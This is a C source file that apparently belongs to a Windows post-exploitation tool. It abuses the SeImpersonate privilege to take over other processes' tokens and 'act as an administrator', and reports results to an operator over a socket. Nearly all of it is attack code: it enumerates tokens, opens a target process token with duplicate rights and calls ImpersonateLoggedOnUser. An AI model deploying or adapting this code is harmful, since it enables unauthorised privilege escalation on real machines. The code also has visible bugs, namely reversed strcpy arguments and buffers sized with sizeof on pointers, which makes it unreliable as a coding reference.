/*
* Author: Aleksa Zatezalo
* Date: September 2023
* Description: Uses the SEImpersonate Priveledge to act as an administrator. 
*/

#include "spoofer.h"
#include "doexec.h"
#include <sddl.h>
#include <userenv.h>
#include <stdlib.h>
#include <Lmcons.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>
#include <tchar.h>

#define ERROR_NOT_ALL_ASSIGNED 1300L

int username(int sockfd){

    /*print Impersonator*/
    char *print_this = "\r\n\r\n[+] The Current User Is: ";
    send(sockfd, print_this, sizeof(char) * strlen(print_this), 0);
    
    char *whoami = "whoami\r\n";
    char *name = doexec(whoami, 0);
    send(sockfd, name, sizeof(char) * strlen(name), 0);
    free(name);
    return 0;
}

char *PrintUserInfoFromToken(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
    char *error = "ERROR";
    char *result;
    char *banner = "[+] Associated user: ";
    if (hProcess == NULL) {
        printf("Error opening process: %d\n", GetLastError());
        return error;
    }

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        printf("Error opening process token: %d\n", GetLastError());
        CloseHandle(hProcess);
        return error;
    }

    DWORD tokenInfoLength = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &tokenInfoLength);
    PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(tokenInfoLength);
    if (!GetTokenInformation(hToken, TokenUser, pTokenUser, tokenInfoLength, &tokenInfoLength)) {
        printf("Error getting token information: %d\n", GetLastError());
        free(pTokenUser);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return error;
    }

    BOOL canImpersonate = FALSE;
    char *impString;
    if (GetTokenInformation(hToken, TokenType, &canImpersonate, sizeof(BOOL), &tokenInfoLength) &&
        canImpersonate == TokenImpersonation) {
        impString = "\r\n[+] You can impersonate with this token.\r\n";
    } else {
        impString = "\r\n[-] You cannot impersonate with this token.\r\n";
    }


    // Convert SID to string
    LPTSTR sidString;
    if (ConvertSidToStringSid(pTokenUser->User.Sid, &sidString)) {
        LocalFree(sidString);
    }

    // Get user name and domain
    DWORD userNameLen = 0;
    DWORD domainNameLen = 0;
    SID_NAME_USE sidType;
    
    LookupAccountSid(NULL, pTokenUser->User.Sid, NULL, &userNameLen, NULL, &domainNameLen, &sidType);
    
    TCHAR* userName = (TCHAR*)malloc(userNameLen * sizeof(TCHAR));
    TCHAR* domainName = (TCHAR*)malloc(domainNameLen * sizeof(TCHAR));

    if (!LookupAccountSid(NULL, pTokenUser->User.Sid, userName, &userNameLen, domainName, &domainNameLen, &sidType)) {
        result = "ERROR: Process potentially terminated.";
    }

    result = malloc(( strlen(banner) + strlen(userName) + strlen(domainName) + strlen(impString) + 2)*sizeof(char));
    strcpy(result, banner);
    strcat(result, domainName);
    strcat(result, "\\");
    strcat(result, userName);
    strcat(result, impString);

    // Cleanup
    free(userName);
    free(domainName);
    free(pTokenUser);
    CloseHandle(hToken);
    CloseHandle(hProcess);
    return result;
}

char *impersonate(int pid){
    HANDLE currentTokenHandle = NULL;
    HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid);
    int error= GetLastError();
    char *ret_message;

    char *open_proc;
    if (error == 0) {
        open_proc = "[+] OpenProcess() success!\r\n";
    } else {
        open_proc = "[-] OpenProccess() failed!\r\n";
        ret_message = malloc(strlen(open_proc) * sizeof(char) + 2);
        strcpy(open_proc, ret_message);
        return ret_message;
    }
    
    char *open_token;
    BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &currentTokenHandle);
    error = GetLastError();
    if (error == 0){
        open_token = "[+] OpenProcessToken() success!\r\n";
    } else {
        open_token = "[-] OpenProcessToken() failed!\r\n";
        ret_message = malloc((sizeof(open_proc) + sizeof(open_token) + 2));
        strcpy(ret_message, open_proc);
        strcat(ret_message, open_token);
        return ret_message;
    }

       if (!ImpersonateLoggedOnUser(currentTokenHandle)) {
        char *errorMsg = "[-] Impersonation Failed.\r\n";
        ret_message = malloc((sizeof(errorMsg) + sizeof(open_token) + sizeof(open_proc)) + 2);
        strcpy(ret_message, open_proc);
        strcat(ret_message, open_token);
        strcat(ret_message, errorMsg);
        return ret_message;
    }
    char *imp_result;
    if (GetLastError() == 0){
        imp_result = "[+] ImpersonatedLoggedOnUser() success!\r\n";
    } else {
        imp_result = "[-] ImpersonatedLoggedOnUser() Return Code: 1 \r\n";
    }
    ret_message = malloc(sizeof(open_proc) + sizeof(open_token) + sizeof(imp_result) + 2);
    strcpy(ret_message, open_proc);
    strcat(ret_message, open_token);
    strcat(ret_message, imp_result);
    return ret_message;
}

void PrintError(LPTSTR msg) {
    DWORD errCode = GetLastError();
    LPVOID lpMsgBuf;

    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        errCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&lpMsgBuf,
        0, NULL);

    _tprintf(TEXT("%s: %d - %s\n"), msg, errCode, (char*)lpMsgBuf);
    LocalFree(lpMsgBuf);
}
